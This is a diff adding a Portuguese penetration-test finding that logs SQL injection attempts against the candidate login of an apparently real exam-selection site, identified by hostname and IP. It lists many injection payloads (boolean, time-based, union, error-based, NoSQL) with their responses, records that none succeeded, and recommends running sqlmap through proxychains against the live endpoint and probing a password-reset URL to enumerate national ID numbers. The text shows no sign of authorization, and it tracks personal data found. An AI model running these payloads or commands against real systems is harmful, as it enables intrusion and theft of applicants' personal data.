@@ -1,0 +1,94 @@
+# F-301 SQLi no Login de Candidato
+Alvo: ifes25-semproxy.selecao.net.br (64.31.24.186)
+Severidade: Informacional (não confirmado)
+Timestamp: 2026-08-25T20:05:00Z
+
+## Vetor
+Teste de SQL Injection no endpoint de login do candidato:
+- URL: https://ifes25-semproxy.selecao.net.br/login/logar/ (POST)
+- Framework: PHP nativo (PHPSESSID)
+- Parâmetros: login (CPF) + senha (senha)
+- Content-Type: application/x-www-form-urlencoded
+
+## Técnicas executadas
+
+### 1. SQLi Básico (OR)
+Payload: cpf=admin' OR '1'='1&senha=teste
+Resultado: HTTP 302 -> /login/?redir=&login= (mesmo que credenciais inválidas)
+
+### 2. SQLi Boolean-Based (AND)
+Payload: cpf=admin' AND 1=1&senha=teste
+Resultado: HTTP 302 -> /login/?redir=&login= (idêntico ao anterior)
+
+Payload: cpf=admin' AND 1=2&senha=teste
+Resultado: HTTP 302 -> /login/?redir=&login= (idêntico - sem diferença entre true/false)
+
+### 3. SQLi Time-Based
+Payload: cpf=admin' OR IF(1=1,SLEEP(5),0)&senha=teste
+Resultado: 1.58s (sem delay - SLEEP ignorado ou DB não é MySQL)
+
+Payload: cpf=admin' AND (SELECT IF(1=1,SLEEP(3),0))&senha=teste
+Resultado: 1.83s (sem delay)
+
+Payload: cpf=admin' AND (SELECT BENCHMARK(50000000,MD5('test')))&senha=teste
+Resultado: 1.88s (sem delay)
+
+### 4. SQLi Union-Based
+Payload: cpf=' UNION SELECT 1,2,3-- -&senha=teste
+Payload: cpf=11111111111' UNION SELECT 1,2,3,4,5,6,7,8,9,10-- -&senha=teste
+Resultado: HTTP 302 (sem diferença no output)
+
+### 5. SQLi Error-Based (MySQL)
+Payload: cpf=admin' AND ExtractValue(1,concat(0x7e,(SELECT version()))),&senha=teste
+Payload: cpf=admin' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a),&senha=teste
+Resultado: HTTP 302 (sem erro MySQL visível)
+
+### 6. SQLi no campo senha
+Payload: cpf=11111111111&senha=' OR '1'='1
+Payload: cpf=11111111111&senha=teste'--
+Payload: cpf=' OR '1'='1&senha=' OR '1'='1
+Resultado: HTTP 302 (sem diferença)
+
+### 7. NoSQLi
+Payload: cpf[$ne]=admin&senha[$ne]=teste
+Resultado: HTTP 302 (mesmo comportamento)
+
+### 8. JSON Content-Type
+Payload: {"cpf":"admin OR 1=1--","senha":"teste"}
+Resultado: HTTP 302 (mesmo comportamento - PHP nativo não faz parsing JSON)
+
+### 9. Com CPF válido (formato de 11 dígitos)
+Payload: cpf=00000000000&senha=teste
+Resultado: HTTP 302 -> /login/?redir=&login= (mesmo que SQLi)
+
+## Análise
+
+### Possíveis causas da não-detecção:
+1. **Input sanitization**: O CPF passa por validação server-side (máscara "cpf" no frontend sugere validação de formato de 11 dígitos)
+2. **Parameterized queries**: A aplicação pode usar prepared statements/PDO
+3. **ORA/ORM**: O PHP pode usar um wrapper de banco que sanitiza inputs
+4. **DB não-SQL**: Embora improvável, o backend pode usar um banco NoSQL ou flat file
+5. **CPF validation first**: A aplicação valida o CPF antes de consultar o banco - CPFs com caracteres especiais (' ou ") são rejeitados antes da query
+
+### Comportamento observado:
+- TODAS as requisições POST para /login/logar/ retornam HTTP 302 -> /login/?redir=&login=
+- Não há diferença de response entre credenciais válidas, inválidas ou SQLi
+- O redirect mantém o mesmo PHPSESSID
+- O response body (após redirect) contém o formulário de login com div de erro vazia (display:none)
+- Erros de validação são exibidos apenas via JS client-side
+
+## PII encontrado
+Nenhum - SQLi não foi confirmado.
+
+## Recomendação
+1. Confirmar manualmente inserindo dados reais de login (se disponíveis)
+2. Testar com sqlmap para bypass de WAF/input filters
+3. Investigar se o campo "login" aceita CPF formatado (000.000.000-00) e tentar SQLi via CPF formatado
+4. Testar IDOR via /login/esqueci/?cpf= (esqueci senha) - possível enumeração de CPF
+
+## Comando de verificação adicional
+```bash
+proxychains4 sqlmap -u "https://ifes25-semproxy.selecao.net.br/login/logar/" \
+  --data="login=1&senha=1" \
+  --dbms=mysql --level=3 --risk=2 --batch
+```
